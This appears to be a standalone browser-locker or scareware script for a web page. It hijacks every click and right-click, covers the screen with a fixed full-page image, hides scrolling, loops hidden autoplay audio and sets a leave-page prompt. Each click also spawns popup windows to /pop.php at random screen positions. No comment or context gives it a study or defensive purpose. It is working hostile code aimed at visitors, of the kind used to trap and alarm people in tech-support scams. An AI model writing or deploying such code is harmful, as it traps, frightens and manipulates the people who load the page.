document.addEventListener('click', function (e) {
    if (e.target.tagName.toLowerCase() === 'a') {
        e.preventDefault();
    }

    if (!document.getElementById('overlayImage')) {
        createOverlay();
    }

    openPopup();
});

document.addEventListener('contextmenu', function (e) {
    e.preventDefault();

    if (!document.getElementById('overlayImage')) {
        createOverlay();
    }

    openPopup();
});

function createOverlay() {
    var overlay = document.createElement('div');
    overlay.id = 'overlayImage';
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.background = "url('/./images/t6uno3.png')";
    overlay.style.zIndex = '9999999999';
    document.body.appendChild(overlay);
    document.body.style.overflow = "hidden";

    var preloadImg = new Image();
    preloadImg.src = '/./images/t6uno3.png';

    var audio = document.createElement('audio');
    audio.src = '/./sounds/z4naiu.mp3';
    audio.loop = true;
    audio.autoplay = true;
    audio.style.display = 'none';
    audio.id = 'backgroundAudio';
    document.body.appendChild(audio);

    overlay.addEventListener('click', openPopup);

    window.onbeforeunload = function () {
        return '';
    };
}

function openPopup() {
    var w = window.open('/pop.php', "_blank", "width=10,height=10");
    if (w) {
        w.resizeTo(400*1.5, 299*1.5);
        w.moveTo(
            Math.floor(Math.random() * window.screen.availWidth),
            Math.floor(Math.random() * window.screen.availHeight)
        );
    }
}
